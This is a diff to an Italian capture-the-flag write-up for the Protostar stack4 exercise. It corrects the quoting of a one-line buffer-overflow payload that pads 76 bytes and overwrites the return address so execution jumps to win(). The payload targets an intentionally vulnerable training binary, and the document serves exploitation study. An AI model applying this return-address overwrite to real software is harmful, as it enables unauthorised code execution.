@@ -64,7 +64,7 @@ Arrivati alla cella dell'indirizzo di ritorno scriviamo l'indirizzo di _win()_ (
 
 ### Istruzioni da eseguire
 ```bash
-> 'python -c 'print "a" * 76 + "\xf4\x83\x04\x08"'' | /opt/protostar/bin/stack4
+> python -c 'print "a" * 76 + "\xf4\x83\x04\x08"' | /opt/protostar/bin/stack4
 # sfida vinta
 Segmentation fault
 ```
